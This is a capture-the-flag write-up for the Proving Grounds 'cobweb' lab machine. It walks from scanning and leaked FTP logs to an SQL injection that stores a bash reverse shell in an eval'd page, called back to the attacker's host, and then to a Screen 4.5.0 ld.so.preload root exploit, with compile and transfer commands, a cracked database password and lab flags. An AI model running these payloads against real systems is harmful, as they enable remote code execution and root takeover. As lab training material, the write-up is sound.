# Proving Grounds - cobweb - 192.168.197.162

# Enumeration
## Nmap
### Inital Scan
Command
```
nmap -A -vv -Pn -oA enum/nmap-initial 192.168.197.162
```

Output
```
PORT     STATE  SERVICE    REASON       VERSION
21/tcp   open   ftp        syn-ack      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.197
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh        syn-ack      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 15:5f:9b:80:bc:c4:02:ff:24:71:0a:6f:4e:2e:84:35 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgFlVf8dLp6T0Hx6x3vbvLuyol9k37ugWFzR2qwGMGr84U9pVhutxYk0iHWxlJ7LkWXxyExyo/oyrD8t8kTjgs0T4VT6AtzxPlsdmjWdAncpC45Pr0fQgaritSsEHEco/gMFFqmLCZxcW502GK3o4RloXWpmxXAEzISUNENoKPwYEBk5PvLVf2Ig5r9ZpiVqAYMoM
MrTspU9B8Z10pAPonkeLGXw1S2lhrWCr3NZBgfz+h8A5YP47gJhyAQ5eiHYD/HwetlKC9sQVD5z/b1tmxY4shryJOSu/PxwbaLYYDSJWVD/unfrNqhrKitPltWnDVorUP22lutqDTANWnaLhMLxLVi5GpYFF1GGNNfkJoRwFPLdLK3oEZinUV1jldO+3ZHtAsziRZAh2mmqTm5MeEcvf+1/+6xXiwj5a3mPmQpFmdNM68
AZMJwfQA8JeDNjNr3MQ49sjiGSSxZkVcAgxxKrBERMiPa1RZmewEnf/PLlIOYAEWRbwtVbHhrtCiMQM=
|   256 0f:cb:6b:3d:31:e6:4c:0b:76:db:6e:7d:46:c2:d0:43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOr31UoyfBykixuJkvHM5W+ogF/59yAoTN6ESJP3D/pLYiUShhfonfCdW9K+/OPdL1lZB5Emzb20VXrHpyU9WaE=
|   256 18:47:98:78:55:37:98:52:33:0a:96:1f:06:66:a2:bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5YfZ+KJW8MSuByPeeThmwKND4vz0buwTe6ZRd/mZA7
80/tcp   open   http       syn-ack      Apache httpd 2.4.37 ((centos))
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Login
3306/tcp open   mysql?     syn-ack
| fingerprint-strings: 
|   NULL, RTSPRequest, WMSRequest: 
|_    Host '192.168.49.197' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.197' is not allowed to connect to this MariaDB server
9090/tcp closed zeus-admin conn-refused
```

### Full Scan
Command
```
nmap -A -vv -Pn -p- -oA enum/nmap-full 192.168.197.162
```

Output
```
PORT     STATE  SERVICE    REASON       VERSION
21/tcp   open   ftp        syn-ack      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.197
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh        syn-ack      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 15:5f:9b:80:bc:c4:02:ff:24:71:0a:6f:4e:2e:84:35 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgFlVf8dLp6T0Hx6x3vbvLuyol9k37ugWFzR2qwGMGr84U9pVhutxYk0iHWxlJ7LkWXxyExyo/oyrD8t8kTjgs0T4VT6AtzxPlsdmjWdAncpC45Pr0fQgaritSsEHEco/gMFFqmLCZxcW502GK3o4RloXWpmxXAEzISUNENoKPwYEBk5PvLVf2Ig5r9ZpiVqAYMoM
MrTspU9B8Z10pAPonkeLGXw1S2lhrWCr3NZBgfz+h8A5YP47gJhyAQ5eiHYD/HwetlKC9sQVD5z/b1tmxY4shryJOSu/PxwbaLYYDSJWVD/unfrNqhrKitPltWnDVorUP22lutqDTANWnaLhMLxLVi5GpYFF1GGNNfkJoRwFPLdLK3oEZinUV1jldO+3ZHtAsziRZAh2mmqTm5MeEcvf+1/+6xXiwj5a3mPmQpFmdNM68
AZMJwfQA8JeDNjNr3MQ49sjiGSSxZkVcAgxxKrBERMiPa1RZmewEnf/PLlIOYAEWRbwtVbHhrtCiMQM=
|   256 0f:cb:6b:3d:31:e6:4c:0b:76:db:6e:7d:46:c2:d0:43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOr31UoyfBykixuJkvHM5W+ogF/59yAoTN6ESJP3D/pLYiUShhfonfCdW9K+/OPdL1lZB5Emzb20VXrHpyU9WaE=
|   256 18:47:98:78:55:37:98:52:33:0a:96:1f:06:66:a2:bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5YfZ+KJW8MSuByPeeThmwKND4vz0buwTe6ZRd/mZA7
80/tcp   open   http       syn-ack      Apache httpd 2.4.37 ((centos))
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Login
3306/tcp open   mysql?     syn-ack
| fingerprint-strings: 
|   GenericLines, NULL: 
|_    Host '192.168.49.197' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.197' is not allowed to connect to this MariaDB server
9090/tcp closed zeus-admin conn-refused
```

## Port 21(ftp)
"pub" folder exposed with logs
![](../Attachments/Pasted%20image%2020211007200207.png)
![](../Attachments/Pasted%20image%2020211007200226.png)

Used mget to transfer logs to attacking machine.
```
mget access.log
mget auth.log
mget syslog
```

Interesting page showing in the logs.

```
/.index.php.swp
```

access.log file
```
May  3 18:20:45 localhost sshd[585]: Server listening on 0.0.0.0 port 22.
May  3 18:20:45 localhost sshd[585]: Server listening on :: port 22.
May  3 18:23:56 localhost login[673]: pam_unix(login:session): session opened for user root by LOGIN(uid=0)
May  3 18:23:56 localhost login[714]: ROOT LOGIN  on '/dev/tty1'
Sep  5 13:49:07 localhost sshd[358]: Received signal 15; terminating.
Sep  5 13:49:07 localhost sshd[565]: Server listening on 0.0.0.0 port 22.
Sep  5 13:49:07 localhost sshd[565]: Server listening on :: port 22.
```

auth.log file
```
192.168.118.5 - - [27/Aug/2021:08:45:45 -0400] "GET / HTTP/1.1" 401 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:45:55 -0400] "POST / HTTP/1.1" 401 5422 "http://192.168.120.61/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:46:01 -0400] "GET /index.php HTTP/1.1" 401 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:46:46 -0400] "GET / HTTP/1.1" 401 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:47:04 -0400] "GET /.index.php.swp HTTP/1.1" 200 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:47:23 -0400] "POST / HTTP/1.1" 401 5422 "http://192.168.120.61/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

syslog file
```
<165>1 2003-10-11T22:14:15.003Z mymachine.example.com evntslog - ID47 [exampleSDID@32473 iut="3" eventSource="Application" eventID="1011"] BOMAn application event log entry...
```

## Port 80
Login Page
![](../Attachments/Pasted%20image%2020211007195957.png)
### Nikto
Command
```
nikto -h http://192.168.197.162 -o enum/nikto.txt
```

Output
```
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos)
+ Retrieved x-powered-by header: PHP/7.2.24
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2021-10-07 20:16:23 (GMT-5) (327 seconds)
---------------------------------------------------------------------------
```

### GoBuster
Command
```
gobuster dir -u http://192.168.197.162 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o enum/gobuster.txt
```

Output
```
/login                (Status: 403) [Size: 103]
/Login                (Status: 403) [Size: 103]
/etc                  (Status: 403) [Size: 0]  
/%20                  (Status: 401) [Size: 5422]
/wp-admin             (Status: 403) [Size: 0]   
/phpinfo              (Status: 200) [Size: 76516]
/LogIn                (Status: 403) [Size: 103]  
/LOGIN                (Status: 403) [Size: 103] 
```
 
---

# Vulnerabilities
Downloaded "/.index.php.swp" and viewed source code.
```
wget http://192.168.197.162/.index.php.swp
cat .index.php.swp
```

"mysql_multi_query" variable does not saniize the input data, then passess data to "route_string" variable.
"route_string" variable redirects to page with text from "route_string".
```
<?php
http_response_code(200);

function get_page($conn, $route_string){
    $sql = "SELECT page_data FROM webpages WHERE route_string = \"" . $route_string . "\";";
    //echo "<!-- " . $sql . " -->";
    if(mysqli_multi_query($conn, $sql)){
        $results = mysqli_use_result($conn);
        $first_row = mysqli_fetch_row($results);
        echo mysqli_error($conn);
        return($first_row[0]);
    }else{
        http_response_code(404);
        echo mysqli_error($conn);
        return("");
    }

}

define("included", true);
include "config.php";

$conn = mysqli_connect($db_server, $db_username, $db_password, $db_database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if(isset($_SERVER['REDIRECT_URL'])){
    $route_string = $_SERVER['REDIRECT_URL'];
    eval(get_page($conn, $route_string));
}else{
    eval(get_page($conn, "/"));
}


mysqli_close($conn);

?>
```

Creating code to insert data into SQL for a shell.
```
/shell"; INSERT INTO webpages(route_string, page_data) VALUES ('/celibarin', 'echo shell_exec("bash -i >& /dev/tcp/192.168.49.197/31337 0>&1");'); --
```

URL Encoding using https://www.urlencoder.org/
```
shell%22%3B%20INSERT%20INTO%20webpages%28route_string%2C%20page_data%29%20VALUES%20%28%27%2Fcelibarin%27%2C%20%27echo%20shell_exec%28%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.197%2F31337%200%3E%261%22%29%3B%27%29%3B%20--
```

Running cURL command to run script.
```
curl http://192.168.197.162/shell%22%3B%20INSERT%20INTO%20webpages%28route_string%2C%20page_data%29%20VALUES%20%28%27%2Fcelibarin%27%2C%20%27echo%20shell_exec%28%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.197%2F31337%200%3E%261%22%29%3B%27%29%3B%20--
```

Opening a NC listener and running a cURL command to navigate to created page to run reverse shell.
```
nc -nlvp 31337
curl http://192.168.197.162/celibarin
```

Shell as apache user.
![](../Attachments/Pasted%20image%2020211007221801.png)

---

# Privilege Escalation
## Enumeration
### Database username and password Exposed
Database username and password exposed in config.php
```
website:4c0b569e4c96df157eee1b65dd0e4d41
```

Password is MD5 encrypted. Decrypted password shows.
```
website:ThisIsATest
```

Unable to access mysql on target.

### Screen 4.5.0 Exploit

Machine is using Screen 4.5.0
![](../Attachments/Pasted%20image%2020211007225936.png)

Escalating using Screen 4.5.0 PrivEsc exploit https://www.exploit-db.com/exploits/41154

Finding a location to write this to.

![](../Attachments/Pasted%20image%2020211008170313.png)

I choose to use /var/lib/php/session

Creating the files seen in the exploit manually on attacking machine and transfering to target.

![](../Attachments/Pasted%20image%2020211008184851.png)

![](../Attachments/Pasted%20image%2020211008185208.png)

Compiling the scripts.
```
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c
```

Transfered files to target machine
```
wget http://192.168.49.197/libhax.so
wget http://192.168.49.197/rootshell
```

Followed the remaining commands in the exploit code.
```
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/var/lib/php/session/libhax.so"
```

Ran the exploit
```
/var/lib/php/session/rootshell
```

Root Access
![](../Attachments/Pasted%20image%2020211008190008.png)

---

# Loot
## User
>41e5ec5d5b22f619de757143deb5861c

Command
```
hostname -I | awk '{print $1}';id;hostname;cat local.txt
```

![](../Attachments/Pasted%20image%2020211007222041.png)

## Root/Admin
>396cd1e22c44054285261f62b7bccd19

Command
```
hostname -I | awk '{print $1}';id;hostname;cat proof.txt
```

![](../Attachments/Pasted%20image%2020211008190109.png)